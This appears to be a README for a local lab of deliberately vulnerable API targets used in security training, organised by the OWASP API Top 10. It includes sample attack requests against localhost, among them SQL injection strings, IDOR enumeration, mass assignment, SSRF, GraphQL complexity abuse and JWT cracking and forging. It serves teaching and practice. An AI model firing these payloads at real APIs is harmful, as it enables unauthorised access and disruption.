# API Targets

Vulnerable API implementations for practicing modern web API security testing.

## 🎯 API Services

### 1. DVWA API Extensions
- **Port:** 8095
- **Type:** REST API
- **Vulnerabilities:** All DVWA vulnerabilities accessible via API
- **Focus:** Traditional web vulns in API context

**Testing:**
```bash
# Access via web
http://localhost:8095

# API endpoints
curl http://localhost:8095/vulnerabilities/sqli/
curl http://localhost:8095/vulnerabilities/xss/
```

### 2. Pixi - Vulnerable Photo API
- **Port:** 8096
- **Type:** REST API
- **Vulnerabilities:** SQL injection, broken auth, IDOR, sensitive data exposure
- **Focus:** OWASP API Security Top 10

**Testing:**
```bash
# Browse API
http://localhost:8096

# Example attacks
curl -X POST http://localhost:8096/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test"}'

# SQL injection
curl "http://localhost:8096/api/pictures?search=' OR '1'='1"
```

### 3. crAPI - Completely Ridiculous API
- **Port:** 8097
- **Type:** REST API
- **Vulnerabilities:** BOLA, excessive data exposure, BFLA, SSRF, mass assignment
- **Focus:** Modern API security challenges

**Testing:**
```bash
# Web interface
http://localhost:8097

# API endpoints
curl http://localhost:8097/api/v2/user/dashboard

# IDOR testing
curl http://localhost:8097/api/v2/user/videos/1
curl http://localhost:8097/api/v2/user/videos/2
```

### 4. Damn Vulnerable GraphQL Application
- **Port:** 8098
- **Type:** GraphQL API
- **Vulnerabilities:** Injection, broken auth, information disclosure, DoS
- **Focus:** GraphQL-specific vulnerabilities

**Testing:**
```bash
# Web interface
http://localhost:8098

# GraphQL endpoint
curl -X POST http://localhost:8098/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'

# Introspection query
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

### 5. REST API Goat
- **Port:** 8099
- **Type:** REST API
- **Vulnerabilities:** Full OWASP API Top 10
- **Focus:** Comprehensive API security training

**Testing:**
```bash
# API documentation
http://localhost:8099/swagger

# Test endpoints
curl http://localhost:8099/api/v1/users
curl http://localhost:8099/api/v1/products
```

### 6. Kong API Gateway
- **Port:** 8100 (Proxy), 8101 (Admin)
- **Type:** API Gateway
- **Vulnerabilities:** Misconfiguration, authentication bypass
- **Focus:** API gateway security

**Testing:**
```bash
# Admin API (should be protected!)
curl http://localhost:8101/

# Proxy
curl http://localhost:8100/
```

## 🎓 OWASP API Security Top 10

### API1:2023 - Broken Object Level Authorization (BOLA/IDOR)
```bash
# Test with different user IDs
curl http://localhost:8097/api/v2/user/1/profile
curl http://localhost:8097/api/v2/user/2/profile
curl http://localhost:8097/api/v2/user/3/profile
```

### API2:2023 - Broken Authentication
```bash
# Weak JWT
# Missing rate limiting
# Credential stuffing
curl -X POST http://localhost:8096/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin","password":"admin"}'
```

### API3:2023 - Broken Object Property Level Authorization
```bash
# Mass assignment
curl -X PUT http://localhost:8097/api/v2/user/profile \
  -H "Content-Type: application/json" \
  -d '{"name":"Test","isAdmin":true}'
```

### API4:2023 - Unrestricted Resource Consumption
```bash
# No pagination limit
curl "http://localhost:8099/api/v1/users?limit=999999"

# GraphQL complexity attack
curl -X POST http://localhost:8098/graphql \
  -d '{"query":"{ users { posts { comments { author { posts { comments } } } } } }"}'
```

### API5:2023 - Broken Function Level Authorization (BFLA)
```bash
# Access admin functions as regular user
curl -X DELETE http://localhost:8099/api/v1/admin/users/1 \
  -H "Authorization: Bearer regular_user_token"
```

### API6:2023 - Unrestricted Access to Sensitive Business Flows
```bash
# Automated account creation
for i in {1..100}; do
  curl -X POST http://localhost:8096/api/register \
    -d "email=user$i@test.com&password=pass"
done
```

### API7:2023 - Server Side Request Forgery (SSRF)
```bash
# SSRF via URL parameter
curl "http://localhost:8097/api/v2/fetch?url=http://localhost:8001/admin"
```

### API8:2023 - Security Misconfiguration
```bash
# Exposed admin panel
curl http://localhost:8101/

# Verbose errors
curl http://localhost:8099/api/v1/invalid' OR '1'='1
```

### API9:2023 - Improper Inventory Management
```bash
# Old API versions still active
curl http://localhost:8099/api/v1/users  # Old, vulnerable
curl http://localhost:8099/api/v2/users  # New, secure
```

### API10:2023 - Unsafe Consumption of APIs
```bash
# Third-party API integration issues
# No validation of external API responses
```

## 🛠️ Testing Tools

### Burp Suite
```bash
# Configure proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080

# Test through proxy
curl --proxy http://localhost:8080 http://localhost:8096/api/
```

### Postman/Insomnia
- Import API collections
- Automate testing workflows
- Environment variables for tokens

### OWASP ZAP
```bash
# API scan
zap-cli quick-scan --self-contained \
  --start-options '-config api.addrs.addr.name=.* -config api.addrs.addr.regex=true' \
  http://localhost:8096
```

### ffuf - API Fuzzing
```bash
# Endpoint discovery
ffuf -u http://localhost:8099/api/v1/FUZZ -w /path/to/api-endpoints.txt

# Parameter fuzzing
ffuf -u http://localhost:8096/api/search?FUZZ=test -w /path/to/params.txt

# ID enumeration
ffuf -u http://localhost:8097/api/v2/user/FUZZ -w <(seq 1 1000)
```

### GraphQL Testing
```bash
# Introspection
graphql-introspection http://localhost:8098/graphql

# Automated testing
graphql-cop -t http://localhost:8098/graphql
```

### JWT Analysis
```bash
# Decode JWT
jwt decode <token>

# Crack weak secrets
jwt crack <token> -w /path/to/wordlist.txt

# None algorithm attack
jwt forge -n <token>
```

## 📋 Testing Checklist

- [ ] **Authentication**
  - [ ] Test default credentials
  - [ ] Brute force protection
  - [ ] Session management
  - [ ] JWT security

- [ ] **Authorization**
  - [ ] BOLA/IDOR testing
  - [ ] Privilege escalation
  - [ ] Role-based access
  - [ ] Function-level authorization

- [ ] **Input Validation**
  - [ ] SQL injection
  - [ ] NoSQL injection
  - [ ] Command injection
  - [ ] SSRF

- [ ] **Data Exposure**
  - [ ] Sensitive data in responses
  - [ ] Error message disclosure
  - [ ] API documentation exposure
  - [ ] Version information

- [ ] **Rate Limiting**
  - [ ] No rate limits
  - [ ] Bypass techniques
  - [ ] Resource exhaustion

- [ ] **Business Logic**
  - [ ] Mass assignment
  - [ ] Parameter tampering
  - [ ] Race conditions
  - [ ] Business flow bypass

## 🚀 Practice Scenarios

### Beginner
1. Explore API documentation (Swagger/OpenAPI)
2. Test basic authentication
3. Find IDOR vulnerabilities
4. Enumerate endpoints

### Intermediate
1. Exploit GraphQL introspection
2. JWT manipulation and bypass
3. Mass assignment attacks
4. API rate limit bypass

### Advanced
1. Chain multiple API vulnerabilities
2. SSRF to internal network access
3. GraphQL query complexity attacks
4. Full API compromise scenarios

## 🔍 Quick Assessment

```bash
# Automated API discovery and testing
nuclei -u http://localhost:8096 -t ~/nuclei-templates/

# API endpoint enumeration
gobuster dir -u http://localhost:8099 -w /path/to/api-wordlist.txt

# Quick vulnerability scan
nikto -h http://localhost:8096
```

## 📚 Resources

- [OWASP API Security Project](https://owasp.org/www-project-api-security/)
- [API Security Checklist](https://github.com/shieldfy/API-Security-Checklist)
- [HackTricks - API Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql)
- [PayloadsAllTheThings - API](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/API%20Key%20Leaks)
